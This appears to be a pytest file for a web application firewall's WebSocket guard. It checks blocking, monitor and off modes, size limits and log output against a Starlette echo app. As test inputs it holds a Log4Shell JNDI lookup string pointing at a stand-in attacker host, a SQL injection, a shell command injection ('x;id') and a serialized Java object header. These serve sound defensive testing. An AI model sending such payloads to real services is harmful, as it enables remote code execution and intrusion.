"""WebSocket messages, checked like request bodies, through a real Starlette app."""

import asyncio
import json
import logging

import pytest

from aiwaf.core.websocket import WebSocketGuard, inspect_message

starlette = pytest.importorskip("starlette")
from starlette.applications import Starlette  # noqa: E402
from starlette.routing import WebSocketRoute  # noqa: E402
from starlette.testclient import TestClient  # noqa: E402
from starlette.websockets import WebSocketDisconnect  # noqa: E402


async def echo(websocket):
    await websocket.accept()
    try:
        while True:
            await websocket.send_text("got " + await websocket.receive_text())
    except WebSocketDisconnect:
        pass


def client(mode="block", max_bytes=None):
    app = Starlette(routes=[WebSocketRoute("/ws", echo)])
    app.add_middleware(WebSocketGuard, mode=mode, max_bytes=max_bytes)
    return TestClient(app)


def test_ordinary_messages_pass_and_an_attack_closes_the_socket(caplog):
    with client().websocket_connect("/ws") as ws:
        ws.send_text("hello there")
        assert ws.receive_text() == "got hello there"
        ws.send_text(json.dumps({"q": "O'Reilly's guide"}))
        assert ws.receive_text().startswith("got ")
        with caplog.at_level(logging.WARNING, logger="aiwaf.websocket"):
            ws.send_text(json.dumps({"q": "${jndi:ldap://evil.example/a}"}))
            with pytest.raises(WebSocketDisconnect) as closed:
                ws.receive_text()
    assert closed.value.code == 1008
    event = json.loads(caplog.records[0].getMessage())
    assert event == {"event": "aiwaf.websocket", "mode": "block", "path": "/ws", "rule": "rce_jndi_lookup"}
    assert "evil.example" not in caplog.text


def test_sql_and_command_injection_in_messages_are_found():
    for message in ["1 OR 1=1", "x;id", b"\xac\xed\x00\x05sr\x00\x11java.util.HashMap"]:
        assert inspect_message(message) is not None, message
    assert inspect_message("ordinary text") is None
    assert inspect_message(None) is None


def test_monitor_logs_and_passes_and_off_checks_nothing(caplog):
    with caplog.at_level(logging.WARNING, logger="aiwaf.websocket"):
        with client("monitor").websocket_connect("/ws") as ws:
            ws.send_text("x;id")
            assert ws.receive_text() == "got x;id"
    assert json.loads(caplog.records[0].getMessage())["mode"] == "monitor"
    with client("off").websocket_connect("/ws") as ws:
        ws.send_text("x;id")
        assert ws.receive_text() == "got x;id"


def test_a_message_too_large_to_check_closes_with_1009():
    with client(max_bytes=64).websocket_connect("/ws") as ws:
        ws.send_text("a" * 500)
        with pytest.raises(WebSocketDisconnect) as closed:
            ws.receive_text()
    assert closed.value.code == 1009


def test_http_requests_pass_through_untouched():
    seen = []

    async def app(scope, receive, send):
        seen.append(scope["type"])

    asyncio.run(WebSocketGuard(app)({"type": "http"}, None, None))
    assert seen == ["http"]


def test_fastapi_exports_the_guard():
    import aiwaf.fast

    assert aiwaf.fast.WebSocketGuard is WebSocketGuard
